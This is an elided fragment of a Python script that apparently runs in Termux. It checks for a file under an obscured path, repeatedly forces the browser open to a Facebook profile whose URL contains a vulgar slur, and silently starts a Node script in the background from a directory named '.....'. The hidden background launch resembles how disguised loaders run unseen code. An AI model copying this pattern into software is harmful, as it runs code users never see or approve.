...
if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    ...
    os.system("clear")
    print("\033[1;32mhttps://www.facebook.com/hm.raju.3367\033[0;97m")
    os.system("xdg-open https://www.facebook.com/madarchod.ami.tor.bap")
    time.sleep(10)
    ...
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("\033[1;32mhttps://www.facebook.com/madarchod.ami.tor.bap\033[0;97m")
    os.system("xdg-open https://www.facebook.com/madarchod.ami.tor.bap")
    time.sleep(10)
